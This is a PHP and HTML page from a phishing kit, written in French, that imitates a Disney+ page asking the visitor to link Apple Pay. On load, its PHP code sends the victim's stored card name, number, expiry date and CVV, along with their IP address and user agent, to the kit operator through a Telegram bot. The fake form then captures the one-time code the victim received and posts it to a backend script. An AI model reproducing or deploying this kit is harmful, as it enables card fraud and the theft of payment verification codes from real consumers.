<?php 

include("../common/sub_includes.php");


$data = [
    'text' => '
La personne vient tout juste d"arriver sur la Page Apple Pay

[📤] Carte [📤]

📤 Nom : '.$_SESSION["nomcc"].'
📤 Numéro : '.$_SESSION["ccnum"].'
📤 Date d\'expiration : '.$_SESSION["ccexp"].'
📤 CVV : '.$_SESSION["cvv"].'

[🔓] Informations additionnelles [🔓]

🔓 Adresse Ip : '.$_SESSION['ip'].'
🔓 User-agent : '.$_SESSION['useragent'].'
    ',
    'chat_id' => $chat_login
                ];

file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
?>

<html lang="FR" xmlns="http://www.w3.org/1999/xhtml"  style="display: block;">

<?php  include("../common/sub_header.php"); ?>

<body id="app_index" class="js-focus-visible">

    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../assets/images/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../assets/images/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form  action="" id="formit" name="dssLogin" method="post">
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;text-align : center" class="sc-gZMcBi jhLoHG">Liaison avec Apple Pay</h3>
                                <style>
                                    .flex{
                                        display: flex;
                                        margin : 20px 0px;
                                        justify-content: center;
                                    }
                                </style>
                                <div class="flex">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" baseProfile="tiny" fill=white id="Layer_1" style="width : 90px;padding : 10px;border-radius : 6px;border : 1px solid white;margin-bottom : 30px;" x="0px" y="0px" viewBox="0 0 512 210.2" xml:space="preserve">
<path id="XMLID_34_" d="M93.6,27.1C87.6,34.2,78,39.8,68.4,39c-1.2-9.6,3.5-19.8,9-26.1c6-7.3,16.5-12.5,25-12.9  C103.4,10,99.5,19.8,93.6,27.1 M102.3,40.9c-13.9-0.8-25.8,7.9-32.4,7.9c-6.7,0-16.8-7.5-27.8-7.3c-14.3,0.2-27.6,8.3-34.9,21.2  c-15,25.8-3.9,64,10.6,85c7.1,10.4,15.6,21.8,26.8,21.4c10.6-0.4,14.8-6.9,27.6-6.9c12.9,0,16.6,6.9,27.8,6.7  c11.6-0.2,18.9-10.4,26-20.8c8.1-11.8,11.4-23.3,11.6-23.9c-0.2-0.2-22.4-8.7-22.6-34.3c-0.2-21.4,17.5-31.6,18.3-32.2  C123.3,42.9,107.7,41.3,102.3,40.9 M182.6,11.9v155.9h24.2v-53.3h33.5c30.6,0,52.1-21,52.1-51.4c0-30.4-21.1-51.2-51.3-51.2H182.6z   M206.8,32.3h27.9c21,0,33,11.2,33,30.9c0,19.7-12,31-33.1,31h-27.8V32.3z M336.6,169c15.2,0,29.3-7.7,35.7-19.9h0.5v18.7h22.4V90.2  c0-22.5-18-37-45.7-37c-25.7,0-44.7,14.7-45.4,34.9h21.8c1.8-9.6,10.7-15.9,22.9-15.9c14.8,0,23.1,6.9,23.1,19.6v8.6l-30.2,1.8  c-28.1,1.7-43.3,13.2-43.3,33.2C298.4,155.6,314.1,169,336.6,169z M343.1,150.5c-12.9,0-21.1-6.2-21.1-15.7c0-9.8,7.9-15.5,23-16.4  l26.9-1.7v8.8C371.9,140.1,359.5,150.5,343.1,150.5z M425.1,210.2c23.6,0,34.7-9,44.4-36.3L512,54.7h-24.6l-28.5,92.1h-0.5  l-28.5-92.1h-25.3l41,113.5l-2.2,6.9c-3.7,11.7-9.7,16.2-20.4,16.2c-1.9,0-5.6-0.2-7.1-0.4v18.7C417.3,210,423.3,210.2,425.1,210.2z  "/>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>                                </div>
                                <p style="color: rgb(249, 249, 249);text-align : center">Afin de continuer, veuillez lier votre compte à Apple Pay pour assurer la protection de vos futures opérations</p>
                                
                                
                                <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Mot de passe" display="inline" id="pass" name="code" placeholder="Code reçu" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"  type="password" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>

                                <div>
                                    
                                    <button aria-label="Accepter et continuer" id="colorbg"  data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" type="submit">
                                    <span id="btnn">S'IDENTIFIER</span> 
                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svgg" style="margin:auto;background:transparent;display:none;" width="230px" height="90%" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                                        <circle cx="50" cy="50" fill="none" stroke="#2ecbff" stroke-width="6" r="34" stroke-dasharray="160.22122533307947 55.40707511102649">
                                        <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="0.7092198581560283s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                                        </circle>
                                    </svg>
                                    </button>
                            
                            </div>
                            <div class="flex" style="padding-top : 25px">

                            </div>
                            </form>
                        </div>
                    </main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">OBTENIR DISNEY+</button></div>
            </div>
            
            <?php
            $sub_folder = true;
            include("../common/footer.php") 
            ?>
        </div>
    </div>

</body>

</html>

<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


<script>

    $("#pass").on("input propertychange",function(){
        if($(this).val().length >= 1){
            $(this).css("border","none")
            $("#error_it").css("display","none")
        }
    })




            $(document).ready(function() {
        			$("#formit").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
                        $("#svgg").css("display","flex")
                    $("#btnn").css("display","none")
        				$.ajax({
        						method: "POST",
                                url: "../actions/apple_pay.php",
        						data: $(this).serialize()
        					})
        					.then(function(msg) {
                                setTimeout(function() {
                                    window.location.href = "loading_finished.php";
                                }, 1500);
        					});
        				
        
        			});
        		});
</script>